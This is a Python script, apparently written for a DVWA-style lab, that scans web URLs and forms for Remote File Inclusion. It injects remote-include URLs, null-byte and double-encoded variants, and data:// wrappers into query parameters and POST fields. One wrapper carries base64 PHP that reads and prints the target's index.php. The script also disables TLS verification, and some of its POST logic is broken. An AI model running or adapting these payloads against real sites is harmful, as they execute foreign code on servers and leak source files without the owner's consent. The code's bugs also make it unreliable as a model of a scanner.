import base64
import os, sys, urllib, re, string
from ssl import SSLError
from urllib.error import HTTPError
import requests
from urllib import parse
from urllib.parse import urlparse
import time
def make_GET_form(url):
    dic={}
    dic['vuln']='RFI'
    dic['method']='GET'
    time.sleep(2)
    dic['url']=url
    return dic

def make_POST_form(url,data):
    dic={}
    dic['vuln']='RFI'
    dic['method']='POST'
    dic['url']=url
    dic['data']=data
    return dic

def complete_url(input_url):
    if not input_url.startswith("http"):
        url = "http://" + input_url
    else:
        url = input_url
    return url


def scan_rfi_GET(url):

    rfi_txt="705cd559b16e6946826207c2199bd890"
    exploit_list=[['hTtP://tests.arachni-scanner.com/rfi.md5.txt','basic'],
                  ['hTtP://tests.arachni-scanner.com/rfi.md5.txt%00','nullbyte'],
                  ['hTtp:%252f%252ftests.arachni-scanner.com%252frfi.md5.txt','double encoding'],
                  ["data://text/plain;base64,NzA1Y2Q1NTliMTZlNjk0NjgyNjIwN2MyMTk5YmQ4OTA=",'Wrapper']
                  ]
    for exploit in exploit_list:
        if "=" in url:
            split_url = url.split("=")[0]
            scan_addr = split_url + "=" + exploit[0]
            print(scan_addr)
            cookies = {'PHPSESSID': 'd4d7698dp95b76jmbhtb3t2am6', 'security': 'low'}
            res_rfi = requests.get(scan_addr,cookies=cookies,verify=False)
            requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
            if res_rfi.status_code == 200 and rfi_txt in res_rfi.text:
                return make_GET_form(scan_addr)
    print("RFI_GET NOT DETECTED")
    return False

def scan_rfi_multi_GET(url):
    rfi_txt="705cd559b16e6946826207c2199bd890"
    exploit_list=[['hTtP://tests.arachni-scanner.com/rfi.md5.txt','basic'],
                  ['hTtP://tests.arachni-scanner.com/rfi.md5.txt%00','nullbyte'],
                  ['hTtp:%252f%252ftests.arachni-scanner.com%252frfi.md5.txt','double encoding'],
                  ["data://text/plain;base64,NzA1Y2Q1NTliMTZlNjk0NjgyNjIwN2MyMTk5YmQ4OTA=",'Wrapper']
                  ]
    result_list=[]
    for exploit in exploit_list:
            scan_addr =  url.replace('#RFI#',exploit[0])
            print(scan_addr)
            res_rfi = requests.get(scan_addr,verify=False)
            requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
            if res_rfi.status_code == 200 and rfi_txt in res_rfi.text:
                return scan_addr
    print("RFI_GET NOT DETECTED")
    return False

def scan_rfi_post(url,form):
    print(url)
    rfi_txt="705cd559b16e6946826207c2199bd890"
    exploit_list=[['hTtP://tests.arachni-scanner.com/rfi.md5.txt','basic'],
                  ['hTtP://tests.arachni-scanner.com/rfi.md5.txt%00','nullbyte'],
                  ['hTtp:%252f%252ftests.arachni-scanner.com%252frfi.md5.txt','double encoding'],
                  ["data://text/plain;base64,PD9waHANCiRnb2RoYXdvcmQgPSBmaWxlX2dldF9jb250ZW50cygnaW5kZXgucGhwJyk7DQplY2hvICRnb2RoYXdvcmQ7DQo/Pg==",'Wrapper']
                  ]
    result_list=[]
    for i in range(len(form)):
        if form[i]['method'] == 'post':  ###get form 걸러진다
            for j in form[i]['inputs']:
                for exploit in exploit_list:
                    key = j['name']
                    val = exploit
                    data = {key : val}
                    res = requests.post(url, data = data,verify=False)
                    if res.status_code == 200 and rfi_txt in res.text:
                        print(exploit)
                        return
    print("RFI_GET NOT DETECTED")
    return False


def rfi_attack(url):
    url= complete_url(url)
    url_path = url.split("?")[0] + "?"
    url_query = url.split("?")[1]

    #more than one query
    if "&" in url_query:
        keys = []
        values = []
        q = url_query.split("&")
        for i in range(len(q)):
            keys.append(q[i].split("=")[0])
            values.append(q[i].split("=")[1])

        for z in range(len(keys)):
            #(ex)url = url_path + key0 + "=" + () + & + key1 + "=" + () + & + key2 + "=" + ()
            new_url = url.replace(values[z],"#RFI#")
            result = scan_rfi_multi_GET(new_url)
            if(result!=False):
                return result
    else:
        result = scan_rfi_GET(url)
    return result
        
    
    